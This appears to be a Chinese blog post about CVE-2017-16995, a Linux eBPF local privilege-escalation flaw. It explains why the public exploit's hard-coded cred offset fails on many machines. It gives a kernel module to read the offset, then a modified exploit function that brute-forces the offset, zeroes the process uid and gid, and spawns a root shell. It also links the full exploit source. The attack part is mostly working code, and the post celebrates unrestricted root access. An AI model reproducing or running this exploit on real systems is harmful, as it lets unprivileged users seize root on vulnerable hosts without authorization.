# CVE-2017-16995 
Ubuntu本地提权攻击预警
===
## 漏洞描述
该漏洞存在于带有 eBPF bpf(2)系统（CONFIG_BPF_SYSCALL）编译支持的Linux内核中，是一个**内存任意读写**漏洞。该漏洞是由于eBPF验证模块的计算错误产生的。普通用户可以构造特殊的BPF来触发该漏洞，此外恶意攻击者也可以使用该漏洞来进行本地提权操作。

## POC 
原作者exp[此处](https://t.co/vXPrr33S7B)可下载，然而直接运行，很多机器是无法提权成功的。

源代码注释头有说到:
>if different kernel adjust CRED offset + check kernel stack size

针对这个魔鬼数字:CRED_OFFSET=`0x5f8`

<img src="http://o8ydbqznc.bkt.clouddn.com/markdown/1521564739929.png" width="360"/>

[这篇文章](https://www.cnblogs.com/rebeyond/p/8603056.html#commentform
)也说明了真相：
>cred结构体的偏移量可能因为内核版本不同、内核编译选项不同而出现差异，作者给的exp偏移量是写死的

此文作者也给出了一种应对之策：

## 如何获取cred offset常量

### 1、getCredOffset.c

```c++
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/errno.h>
#include <linux/types.h>
int init_module()
{
    printk("[!]current cred offset:%x\n",(unsigned long)&(current->cred)-(unsigned long)current);
    return 0;
}
void cleanup_module()
{
    printk("module cleanup\n");
}
```

### 2、Makefile

```shell
obj-m += getCredOffset.o
 
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
         
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

### 3、编译

```shell
make
```

### 4、执行

```shell
sudo insmod getCredOffset.ko
```

该命令需要有sudo权限的用户执行，通过`insmod`命令将`getCredOffset`模块注入内核

### 5、获取cred offset

```shell
dmesg | grep "cred offset"
```

另开一个命令行执行该命令即可获取到cred offset，最后替换掉原exp中的偏移量即可成功提权。



然而，虽提权成功了，但此法有点怪异，本来想普通用户提权，但却需要用root用户执行命令来协助，有点力不从心。


那么问题又来了，该如何在不同的机器上动态获取这个cred offset呢？

## 获取cred offset常量——暴力尝试

经过上文作者的点拨：
>这个漏洞是个任意地址读写漏洞，所以也可以在确定task_struct地址之后，以当前用户的uid为特征去搜索内存，毕竟cred离task_struct不远。

加上代码中有多处`__read`命令，以及`getuid()`命令，这两个命令都可以读取`uid`。
首先想到的是在往uidptr中写0之前获取此时的uid值，通过以上两种方式对比看有什么差异：

```c++
printf("uidptr      = %lx\n", uidptr);
uid_get=getuid();
uid_read=__read(uidptr);
printf("uid get=%lx,read=%lx\n",uid_get, uid_read);

__write(uidptr, 0); // set both uid and gid to 0

if (getuid() == 0) {
	printf("spawning root shell\n");
	system("/bin/bash");
	exit(0);
}
```

果然如下图所示：

<img src="http://o8ydbqznc.bkt.clouddn.com/markdown/1521566656146.png" width="197"/>

那么规律来了，可以尝试以不同的`cred offset`来获取两个uid来进行对比，一旦对比上，姑且就当做找到了这个“确定”的值，然后再去`__write(uidptr,0)`。修改pwn函数如下：

```c++
static void pwn(uint64_t credoffset) {
	uint64_t fp, sp, ts, credadd, credptr, uidptr, uid_get, uid_read;
	fp = __get_fp();
	if (fp < PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("bogus sp");
	
	ts = __read(sp);

	if (ts < PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", ts);

	uid_get=getuid();
	for(credoffset=0x400;credoffset<0x800;credoffset++){
		credadd=ts + credoffset;
		printf("credadd     = %lx\n", credadd);
		credptr = __read(credadd); // cred
		printf("credptr     = %lx\n", credptr);
		if (credptr < PHYS_OFFSET){
			continue;
		}
		uidptr = credptr + UID_OFFSET; // uid
		if (uidptr < PHYS_OFFSET){
			continue;
		}
		printf("uidptr      = %lx\n", uidptr);
		uid_read=__read(uidptr);
		printf("uid get=%lx,read=%lx\n",uid_get, uid_read);
		if((uid_read&0xffffffff)==uid_get){
			printf("uid get=%lx,read=%lx\n",uid_get, uid_read);
			__write(uidptr, 0); // set both uid and gid to 0
			printf("cred_offset = %lx\n", credoffset);
			if (getuid() == 0) {
				printf("spawning root shell\n");
				system("/bin/bash");
				exit(0);
			}
			printf("failed\n");
			break;
		}
	}
}
```

想到原作者`Vitaly Nikolenko`给的CRED_OFFSET=0x5f8，我这边通过`rebeyond`[这里](https://www.cnblogs.com/rebeyond/p/8603056.html#commentform)给出的方法获取的是0x670，猜测这个值应该范围不大，尝试了一下用0x400~0x800爆破，很不幸，第一次尝试失败，被系统给killed掉啦：

<img src="http://o8ydbqznc.bkt.clouddn.com/markdown/1521563596473.png" width="213"/>

调整一下范围：0x500~0x800，ok 搞定！

<img src="http://o8ydbqznc.bkt.clouddn.com/markdown/1521637032613.png" width="215"/>

>不同机器此CRED_OFFSET偏移量可能还有差异，可以视情况稍微调整一下范围，试出结果应该不难。

最后来体验一把提权后带来的快感，root用户想干嘛干嘛，如图：

<img src="http://o8ydbqznc.bkt.clouddn.com/markdown/1521567818252.png" width="386"/>

完整代码见[这里](https://raw.githubusercontent.com/ljf1239848066/linux-kernel-exploits/master/CVE-2017-16995/upstream44v5.c)。


>参考链接：
 - http://www.freebuf.com/news/165608.html
 - https://cert.360.cn/warning/detail?id=119f849891f2a1b5deef65f99923ab5a
 - https://www.cnblogs.com/rebeyond/p/8603056.html#commentform

